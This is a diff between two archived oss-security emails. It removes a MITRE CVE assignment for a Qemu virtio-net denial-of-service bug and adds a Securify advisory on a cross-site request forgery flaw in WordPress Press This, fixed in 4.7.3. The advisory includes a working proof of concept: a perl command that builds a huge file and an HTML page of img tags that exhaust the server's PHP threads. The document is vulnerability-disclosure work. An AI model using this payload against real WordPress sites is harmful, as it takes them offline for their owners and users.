@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2134" "Friday" "18" "September" "2015" "15:11:09" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20150918191109.4FD816C002B@smtpvmsrv1.mitre.org>" "50" "[oss-security] Re: CVE request Qemu: net: virtio-net possible remote DoS" nil nil nil "9" "2015091819:11:09" "[oss-security] Re: CVE request Qemu: net: virtio-net possible remote DoS" (number mark "        cve-assign@m Sep 18   50/2134  " thread-indent "\"[oss-security] Re: CVE request Qemu: net: virtio-net possible remote DoS\"\n") "<alpine.LFD.2.20.1509181611430.12625@wniryva>" ("<alpine.LFD.2.20.1509181611430.12625@wniryva>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4525" "Tuesday" "7" "March" "2017" "00:02:13" "+0100" "Summer of Pwnage" "lists@securify.nl" "<2de68dc9-33ed-3cfc-a621-f958625a2a6b@securify.nl>" "96" "[oss-security] Cross-Site Request Forgery in WordPress Press This function allows DoS" nil nil nil "3" "2017030623:02:13" "[oss-security] Cross-Site Request Forgery in WordPress Press This function allows DoS" (number mark "U       lists@securi Mar  7   96/4525  " thread-indent "\"[oss-security] Cross-Site Request Forgery in WordPress Press This function allows DoS\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 14017 invoked by uid 550); 18 Sep 2015 19:11:22 -0000
+Received: (qmail 19723 invoked by uid 550); 6 Mar 2017 23:02:28 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,63 +11,115 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 13999 invoked from network); 18 Sep 2015 19:11:21 -0000
-In-Reply-To: <alpine.LFD.2.20.1509181611430.12625@wniryva>
-Message-Id: <20150918191109.4FD816C002B@smtpvmsrv1.mitre.org>
-Cc: cve-assign@mitre.org, oss-security@lists.openwall.com, jasowang@redhat.com
-Date: Fri, 18 Sep 2015 15:11:09 -0400 (EDT)
-From: cve-assign@mitre.org
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Re: CVE request Qemu: net: virtio-net possible remote DoS
-To: ppandit@redhat.com
+Received: (qmail 19667 invoked from network); 6 Mar 2017 23:02:25 -0000
+X-Virus-Scanned: amavisd-new at edge1.intern.zimbra-login.net
+From: Summer of Pwnage <lists@securify.nl>
+To: oss-security@lists.openwall.com
+Organization: Securify B.V.
+Message-ID: <2de68dc9-33ed-3cfc-a621-f958625a2a6b@securify.nl>
+Date: Tue, 7 Mar 2017 00:02:13 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+ Thunderbird/45.7.0
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8; format=flowed
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] Cross-Site Request Forgery in WordPress Press This function allows
+ DoS
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+------------------------------------------------------------------------
+Cross-Site Request Forgery in WordPress Press This function allows DoS
+------------------------------------------------------------------------
+Sipke Mellema, July 2016
 
-> Qemu emulator built with the Virtual Network Device(virtio-net) support is
-> vulnerable to a DoS issue. It could occur while receiving large packets over
-> the tuntap/macvtap interfaces and when guest's virtio-net driver did not
-> support big/mergeable receive buffers.
-> 
-> An attacker on the local network could use this flaw to disable guest's
-> networking by sending a large number of jumbo frames to the guest, exhausting
-> all receive buffers and thus leading to a DoS situation.
-> 
-> https://lists.gnu.org/archive/html/qemu-devel/2015-09/msg04729.html
-> https://lists.gnu.org/archive/html/qemu-devel/2015-09/msg04730.html
-> https://lists.gnu.org/archive/html/qemu-devel/2015-09/msg04731.html
+------------------------------------------------------------------------
+Abstract
+------------------------------------------------------------------------
+A Cross-Site Request Forgery (CSRF) vulnerability exists on the Press
+This page of WordPress. This issue can be used to create a Denial of
+Service (DoS) condition  if an authenticated administrator visits a
+malicious URL.
 
-> When packet is truncated during receiving, we drop the packets but
-> neither discard the descriptor nor add and signal used
-> descriptor. This will lead several issues:
-> 
-> - sg mappings are leaked
-> - rx will be stalled if a lots of packets were truncated
+------------------------------------------------------------------------
+OVE ID
+------------------------------------------------------------------------
+OVE-20160718-0005
 
-Use CVE-2015-7295.
+------------------------------------------------------------------------
+Tested versions
+------------------------------------------------------------------------
+This issue was successfully tested on WordPress [2] version 4.5.3.
 
-As far as we can tell, "sg mappings are leaked" and "rx will be
-stalled" aren't independent problems.
+------------------------------------------------------------------------
+Fix
+------------------------------------------------------------------------
+This issue is resolved in WordPress version 4.7.3. [3]
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+------------------------------------------------------------------------
+Introduction
+------------------------------------------------------------------------
+WordPress is web software you can use to create a website, blog, or
+app. A Cross-Site Request Forgery (CSRF) vulnerability exists on the
+Press This page of WordPress. This issue can be used to create a Denial
+of Service (DoS) condition of an affected WordPress site.
 
-iQIcBAEBCAAGBQJV/GCUAAoJEL54rhJi8gl5CR0P/3W08SnlO7UG5romkJRFhZUX
-MMmoucggrWMmrY1hGq11cODk5DmD53R0WDg5Eu+XfEwEyryHpTk034kJUub3yLOM
-ylj+ZatLRWpRw2qofMSyI7wfJHOWbi6XjfzVPsMX1biub1ncIMnt3DYngXlKj4H5
-leXdQDbcatxUvuSe7wYwxiFEVsLi0tS9EdlFmjxgQ63iOGqZXI6TL/pkvAeOPx4C
-OIbxd2lAfyjtSxPo9NOXoXzlOxSoBm7n1KTD+nwOIVxlkbLQfh63lIycJ6dH717u
-nuq1p7Hgd+KwkG6aqjD7iy+B0NLuS1oJj3Yl9P2bxlLjXf3qqieaOjk4AeZoMNXZ
-zMx0f8ejWFgO0IP/kknslYcRnV6vvP+bBSmdCDwJZPi/ov82yVtRfIt3CLJ3rifP
-Ms3/0sb58x5PITjYurioOJxDSpmXClRgUpahnCKBQijyNyLQF5tih0FSJ7RRqZub
-/6cgwOvY6TIJJklZ9I4j/xn2VFbFwkf0ShqWzBIr2QZ3I5zNuwuGNGLE0Z/nGgf/
-Pds9nDggKCHEPy96xsnfevbdGwIkNofRpTWwCRe1Qyy4KfM6t8mZ2vL4kjB+8Ngp
-vDpulZkDVaLB7FvZ9Gb3SWICeLt2rMq8nQy3vJGKtss8zI2dcwJ6a0H/EP+cVaD8
-nPCVm7dzeyUY84OY6uyN
-=pwm1
------END PGP SIGNATURE-----
+------------------------------------------------------------------------
+Details
+------------------------------------------------------------------------
+WordPress' Press This [4] function allows quick publishing with a
+special web browser bookmarklet. An admin can also visit the Press This
+page directly. One of the features of Press This is scanning an external
+server for embeddable content. This is done with a GET request to:
+/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan
+
+When this URL is called, Press This will download the page located at
+"URL" and look for content such as images and other embeddable elements.
+No maximum is set for the amount of data Press This can retrieve when
+scanning. This behavior can be abused by setting the external URL to a
+huge file and have an authenticated admin visit it. The PHP process will
+use 100% of its CPU resources to process the file. If an authenticated
+admin can be lured to an external page, then the malicious URL can be
+called many times, blocking all PHP server threads. This will cause the
+server to be unreachable for a while.
+
+------------------------------------------------------------------------
+Proof of concept
+------------------------------------------------------------------------
+On an external server, create a large text file with the command:
+perl -e 'print "<>"x28000000' > foo.txt
+
+Next, create a file called dos.html on the external server with enough
+entries to fill the connection pool of the WordPress server, as follows:
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
+<img src='http://<wp
+server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
+server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
+[..]
+(replace <wp server> with the WordPress server address and <external
+server> with the external server)
+
+Now have a logged in admin visit dos.html. The server will be down for a
+while.
+------------------------------------------------------------------------
+References
+------------------------------------------------------------------------
+[1] 
+https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
+[2] https://wordpress.org/
+[3] 
+https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
+[5] https://codex.wordpress.org/Press_This
